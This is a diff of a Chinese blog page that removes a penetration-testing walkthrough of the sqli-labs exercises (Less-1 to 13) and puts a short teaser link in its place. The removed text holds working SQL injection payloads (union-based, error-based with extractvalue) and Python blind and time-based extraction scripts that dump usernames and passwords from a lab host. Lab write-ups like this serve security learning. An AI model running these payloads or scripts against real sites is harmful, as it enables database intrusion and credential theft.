@@ -179,9 +179,24 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2024-01-02 09:21:02 / 修改时间：10:04:32" itemprop="dateCreated datePublished" datetime="2024-01-02T09:21:02+08:00">2024-01-02</time>
+              <time title="创建时间：2024-01-02 09:21:02" itemprop="dateCreated datePublished" datetime="2024-01-02T09:21:02+08:00">2024-01-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-01-06 12:08:30" itemprop="dateModified" datetime="2024-01-06T12:08:30+08:00">2024-01-06</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">渗透笔记</span></a>
+                </span>
             </span>
 
           
@@ -195,115 +210,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h1><p>先输入一个？id&#x3D;1,看看什么情况</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020924925.png"></p>
-<p>当输入id&#x3D;1’时，出现下面的语法错误</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020924822.png"></p>
-<p>继续加上单引号，发现语法正确了，说明闭合位置就是   ‘  （单引号）</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020924056.png"></p>
-<p>输入– -注释掉单引号后面的内容</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020924626.png"></p>
-<p>用order by 找出列数，这里的列数是4</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020925040.png"></p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020925479.png"></p>
-<p>将前面的id设为-1，联合查询找到回显位置，为2，3，可以在2，3的位置上换上自己想要查询的语句</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020925699.png"></p>
-<p>找出表名</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020925792.png"></p>
-<p>找出列名</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020925770.png"></p>
-<p>就可以找数据了</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020925496.png"></p>
-<h1 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h1><p>找闭合</p>
-<p>这里输入一可以正常显示</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020932898.png"></p>
-<p>id&#x3D;1,看报错信息，后面是说明符号就是什么闭合</p>
-<p>这里\后面什么都没有就说明是数字型闭合</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020932802.png"></p>
-<p>后面查询语句和前面一样</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020932697.png"></p>
-<h1 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h1><p>这里用id&#x3D; 1\的方法看出，闭合位是’)</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020935056.png"></p>
-<h1 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h1><p>这里用id&#x3D;1\的方法看出，闭合位置是”)</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020939845.png"></p>
-<h1 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h1><p>判断闭合 这里的闭合是’</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020940878.png"></p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020940406.png"></p>
-<p>这里没有任何回显位置，但是有报错语句，可以考虑用盲注或者报错</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020940582.png"></p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020941888.png"></p>
-<p>这里采用的是报错，报错后面加的关键词是and,这里的select user()可以换成自己想要执行的语句</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020941993.png"></p>
-<p>可以报错</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020941764.png"></p>
-<h1 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h1><p>这里监测出，闭合点是”</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020945931.png"></p>
-<p>其他的和上一题思路一样</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020945052.png"></p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020945007.png"></p>
-<h1 id="第七题"><a href="#第七题" class="headerlink" title="第七题"></a>第七题</h1><p>这里没有错误信息显示，只会显示语法错误，通过尝试，查出他的闭合点’))<img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020947567.png"></p>
-<p>因为这里只有错误和正确的回显</p>
-<p>所以这里用盲注脚本去解决</p>
-<p>这里调用payload去判断</p>
-<p>payload &#x3D; url + f” and ascii(substr(user(),{i},1))&gt;{mid}– -“</p>
-<p>将user换成想要查询的语句</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"><span class="comment">#找出api,这个是注入的api,这个要找对，找不对没有值</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.2.78/sqli/Less-7/?id=1&#x27;))&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_2</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">        start = <span class="number">32</span></span><br><span class="line">        end = <span class="number">128</span></span><br><span class="line">        mid = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> start &lt; end:</span><br><span class="line">            payload = url + <span class="string">f&quot;/**/and/**/if(ascii(substr(user(),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)--+&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(payload)</span><br><span class="line">            response = session.get(payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">chr</span>(mid))</span><br><span class="line">                start = mid + <span class="number">1</span></span><br><span class="line">                mid = (start + end) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = mid</span><br><span class="line">                mid = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        name += <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line">db_2()</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020947375.png"></p>
-<h1 id="第八题"><a href="#第八题" class="headerlink" title="第八题"></a>第八题</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.78/sqli/Less-8/?id=1&quot;</span><br></pre></td></tr></table></figure>
-
-<p>找出第八题的闭合 是双引号</p>
-<p>其他的和第七题差不多</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020949183.png"></p>
-<h1 id="第九题"><a href="#第九题" class="headerlink" title="第九题"></a>第九题</h1><p>无论id后面接什么都是you are in,回显没有变化</p>
-<p>这里考虑用时间盲注</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020950023.png"></p>
-<p>判断是否沉睡</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.78/sqli/Less-9/id=1&#x27; and if(ascii(substr(user(),1,1))=114, sleep(3),0) --+</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020950859.png"></p>
-<p>发现有沉睡注入，这里考虑用时间注入</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">session = requests.Session()</span><br><span class="line"><span class="comment">#找出api,这个是注入的api,这个要找对，找不对没有值</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.2.78/sqli/Less-9/?id=1&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_2</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">        start = <span class="number">32</span></span><br><span class="line">        end = <span class="number">128</span></span><br><span class="line">        mid = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> start &lt; end:</span><br><span class="line">            payload = url + <span class="string">f&quot;/**/and/**/if(ascii(substr((select group_concat(id,username,password) from users ),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,SLEEP(3),null)--+&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(payload)</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = session.get(payload)</span><br><span class="line">            <span class="keyword">if</span> (time.time() - start_time) &gt;= <span class="number">3</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">chr</span>(mid))</span><br><span class="line">                start = mid + <span class="number">1</span></span><br><span class="line">                mid = (start + end) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = mid</span><br><span class="line">                mid = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        name += <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line">db_2()</span><br></pre></td></tr></table></figure>
-
-<p>时间盲注，数据出来的很慢</p>
-<h1 id="第十题"><a href="#第十题" class="headerlink" title="第十题"></a>第十题</h1><p>和第9题解题思路一样</p>
-<p>就是闭合由单引号换成了双引号</p>
-<h1 id="第十一题"><a href="#第十一题" class="headerlink" title="第十一题"></a>第十一题</h1><p>在表中输入admin,发现两个回显位</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020953311.png"></p>
-<p>这里只有账号密码正确才会显示，这里我们用yakit进行抓包</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020953897.png"></p>
-<p>找到回显位是’</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020953238.png"></p>
-<p>输入uname&#x3D;admin’ union select 1,2– -&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit  找到两个回显位置</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020955707.png"></p>
-<p>尝试把admin换成-1</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020955883.png"></p>
-<p>uname&#x3D;-1’ union select 1,group_concat(username,password) from users– -&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020956626.png"></p>
-<h1 id="第十二题"><a href="#第十二题" class="headerlink" title="第十二题"></a>第十二题</h1><p>直接空字符提交，这里可以看到闭合位是”)</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020959714.png"></p>
-<p>输入admin”)– -发现有正常回显<img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020958023.png"></p>
-<p>输入-1”)union select 1,2– - 发现有两个回显位置</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020958341.png"></p>
-<p>直接在回显怼上查询语句 </p>
-<p>-1”) union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()– -</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020958227.png"></p>
-<p>-1”) union select 1,group_concat(column_name) from information_schema.columns where table_name &#x3D; ‘users’ and table_schema&#x3D;database()– -</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020958551.png"></p>
-<p>-1”) union select 1,group_concat(id,username,password) from users limit 0,1– -</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401020959339.png"></p>
-<h1 id="第十三题"><a href="#第十三题" class="headerlink" title="第十三题"></a>第十三题</h1><p>劫持到13题，admin用户登录的包</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401021002406.png"></p>
-<p>uname&#x3D;admin’&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</p>
-<p>当我们在admin后面加’发现响应包里面有报错提示，这里我们考虑使用报错注入</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401021002410.png"></p>
-<p>uname&#x3D;admin’)– -&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</p>
-<p>找到闭合是’)</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401021002705.png"></p>
-<p>uname&#x3D;admin’)and (extractvalue(1,concat(0x7e,(select user()),0x7e)))– -&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</p>
-<p>这里使用extractvalue，爆出user()名字</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401021004131.png"></p>
-
+          <p>此篇介绍了sqli题目</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/01/02/sqli/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
